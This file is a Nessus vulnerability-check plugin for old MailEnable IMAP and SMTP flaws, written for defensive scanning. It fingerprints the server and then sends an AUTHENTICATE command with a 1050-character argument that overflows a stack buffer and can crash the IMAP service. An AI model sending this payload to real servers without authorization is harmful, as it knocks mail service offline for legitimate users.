#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(17974);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2005-1013", "CVE-2005-1014", "CVE-2005-1015");
  script_bugtraq_id(12994, 12995, 13040);
  script_osvdb_id(15231, 15232, 15308);

  script_name(english:"MailEnable IMAP / SMTP Multiple Remote Vulnerabilities");
  script_summary(english:"Checks for IMAP overflow and SMTP DoS vulnerabilities in MailEnable");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by multiple issues." );
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of MailEnable Professional or
MailEnable Enterprise Edition that is prone to the following
vulnerabilities :

  - An IMAP Authenticate Request Buffer Overflow Vulnerability
    Sending an AUTHENTICATE or LOGIN command with an argument 
    of 1016 characters or more overflows a stack-based buffer. 
    An attacker can leverage this flaw to overwrite sensitive 
    program control variables and thereby control execution 
    flow of the server process.

  - An SMTP Malformed EHLO Request Denial Of Service Vulnerability
    The SMTP service does not properly handle malformed EHLO 
    commands and may crash when it encounters an argument 
    containing the character 0x99. A remote attacker could use
    this flaw to crash the SMTP service, thereby denying service
    to legitimate users." );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Apr/76" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Apr/104" );
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/" );
  script_set_attribute(attribute:"solution", value:
"Apply the IMAP and SMTP hotfix from 4th April 2005. Note that the
hotfix does not fix the overflow involving an oversize LOGIN command." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_set_attribute(attribute:"plugin_publication_date", value: "2005/04/06");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/04");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
if (get_kb_item("imap/"+port+"/false_imap")
 || get_kb_item("imap/"+port+"/overflow")) exit(0);


# Make sure it's MailEnable.
soc = open_sock_tcp(port);
if (!soc) exit(0);
s = recv_line(socket:soc, length:2048);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
mailenable = 0;
tag = 1;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:2048)) {
  s = chomp(s);
  # nb: the closing message identifies it if it's MailEnable.
  if ("* BYE MailEnable IMAP4rev1 server version" >< s) mailenable = 1;
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
if (!mailenable) exit(0);


# Try to crash the IMAP service.
#
# nb: a banner check would result in false positives if the hotfix has
#     been applied - it doesn't alter the version number.
#
# - establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);
# - read banner.
s = recv_line(socket:soc, length:2048);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
# - try the exploit.
++tag;
c = string("a", string(tag), " AUTHENTICATE ", crap(1050));
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:2048)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
# - if there was no response, make sure the service is really down.
if (!s || !resp) {
  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) s2 = recv_line(socket:soc, length:2048);

  # If we couldn't establish the connection or read the banner,
  # there's a problem.
  if (!soc2 || !strlen(s2)) {        
    security_hole(port);
    exit(0);
  }
  close(soc2);
}
# - logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:2048)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
